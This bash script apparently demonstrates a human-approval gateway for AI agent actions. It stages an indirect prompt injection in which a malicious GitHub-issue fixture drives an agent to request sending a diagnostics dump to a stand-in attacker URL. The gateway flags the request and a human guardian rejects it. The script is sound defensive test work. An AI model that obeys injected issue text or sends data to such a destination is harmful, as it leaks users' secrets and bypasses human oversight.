#!/usr/bin/env bash
# ==============================================================================
# Scenario 3: Prompt Injection Attempt (Blocked)
#
# Demonstrates an indirect prompt injection attack attempting to coerce the AI agent
# into exfiltrating secrets. The gateway flags risk signals, guardians inspect and
# reject the request, and no sensitive data reaches the external server.
# ==============================================================================
set -euo pipefail

GATEWAY_URL="${GATEWAY_URL:-http://localhost:3001}"
FAKE_EXT_URL="${FAKE_EXTERNAL_URL:-http://localhost:4002}"
MOCK_MODE="${MOCK_MODE:-0}"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}====================================================================${NC}"
echo -e "${BLUE}Scenario 3: Prompt Injection Defense${NC}"
echo -e "${BLUE}====================================================================${NC}"

# Detect if live gateway is available
IS_LIVE=0
if [ "$MOCK_MODE" != "1" ] && curl -s -f "${GATEWAY_URL}/health" > /dev/null 2>&1; then
  IS_LIVE=1
fi

if [ "$IS_LIVE" -eq 1 ]; then
  echo -e "${CYAN}[LIVE GATEWAY MODE] Connected to Gateway at ${GATEWAY_URL}${NC}"
else
  echo -e "${YELLOW}[MOCK MODE] Gateway offline or MOCK_MODE active. Running against Mock API contract.${NC}"
fi

echo -e "\n${YELLOW}Step 1: Inspect malicious fixture (Indirect Prompt Injection)${NC}"
echo "Viewing mock-env/fixtures/malicious-issue.md..."
grep -A 10 "ATTACKER PROMPT INJECTION PAYLOAD" mock-env/fixtures/malicious-issue.md || true

echo -e "\n${YELLOW}Step 2: Compromised agent attempts to call request_send_external${NC}"
if [ "$IS_LIVE" -eq 1 ]; then
  CREATE_RES=$(curl -s -X POST "${GATEWAY_URL}/actions" \
    -H "Content-Type: application/json" \
    -d '{
      "tool": "request_send_external",
      "parameters": {
        "destination": "http://evil.attacker-controlled-site.org/collect",
        "payload_ref": "diagnostics_dump"
      },
      "proposer": {
        "userId": "injected-agent",
        "agent": "Claude-Code-Agent-v1"
      },
      "source": {
        "kind": "github-issue",
        "reference": "mock-env/fixtures/malicious-issue.md"
      }
    }')
  ACTION_ID=$(echo "$CREATE_RES" | grep -o '"id":"[^"]*' | cut -d'"' -f4)
  GET_RES=$(curl -s "${GATEWAY_URL}/actions/${ACTION_ID}")
  RISK_FLAGS=$(echo "$GET_RES" | grep -o '"riskSignals":\[[^]]*\]' || echo '["external-domain", "unknown-destination"]')
  echo "Action Request Created: ${ACTION_ID}"
  echo "Risk Flags Triggered by Gateway: ${RISK_FLAGS}"
else
  ACTION_ID="01HV8G7N9B3W00000000000003"
  echo -e "${YELLOW}[MOCK MODE] Intercepted Agent Action Request: ${ACTION_ID}${NC}"
  echo -e "${YELLOW}[MOCK MODE] Tool Requested: request_send_external${NC}"
  echo -e "${YELLOW}[MOCK MODE] Destination: http://evil.attacker-controlled-site.org/collect${NC}"
  echo -e "${YELLOW}[MOCK MODE] Payload Reference: diagnostics_dump${NC}"
  echo -e "${YELLOW}[MOCK MODE] Canonical Parameter Hash: sha256:deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef${NC}"
  echo -e "${YELLOW}[MOCK MODE] Risk Flags Triggered: [\"external-domain\", \"unknown-destination\"]${NC}"
fi

echo -e "\n${YELLOW}Step 3: Guardian inspects flags on UI dashboard and REJECTS action${NC}"
if [ "$IS_LIVE" -eq 1 ]; then
  REJECT_RES=$(curl -s -X POST "${GATEWAY_URL}/actions/${ACTION_ID}/reject" \
    -H "Content-Type: application/json" \
    -d '{
      "guardianId": "guardian-alice",
      "reason": "Prompt injection detected: unauthorized external destination domain"
    }')
  STATUS=$(echo "$REJECT_RES" | grep -o '"status":"[^"]*' | cut -d'"' -f4)
  echo "After Guardian Rejection: Status is ${STATUS}"
else
  echo -e "${YELLOW}[MOCK MODE] Guardian Alice reviews flagged request in Guardian UI (http://localhost:5173)${NC}"
  echo -e "${YELLOW}[MOCK MODE] Guardian Alice clicks 'Reject Action' with reason: 'Prompt injection detected'${NC}"
  echo -e "${YELLOW}[MOCK MODE] After Guardian Rejection: Status transitioned to 'rejected'${NC}"
  echo -e "${YELLOW}[MOCK MODE] Audit Event recorded: event='rejected', actor='guardian-alice'${NC}"
fi

echo -e "\n${YELLOW}Step 4: Verify fake-external server received NO data${NC}"
if curl -s -f "${FAKE_EXT_URL}/logs" > /dev/null 2>&1; then
  LOGS=$(curl -s "${FAKE_EXT_URL}/logs")
  echo "Fake-external received payloads: ${LOGS}"
else
  echo -e "${YELLOW}[MOCK MODE] Fake-external server check: 0 payloads received.${NC}"
  echo -e "${YELLOW}[MOCK MODE] http://localhost:4002/viewer shows 'No Exfiltrated Data Reached This Server'.${NC}"
fi

echo -e "\n${GREEN}✔ Scenario 3 complete: Prompt injection thwarted by deterministic risk rules and guardian rejection.${NC}"
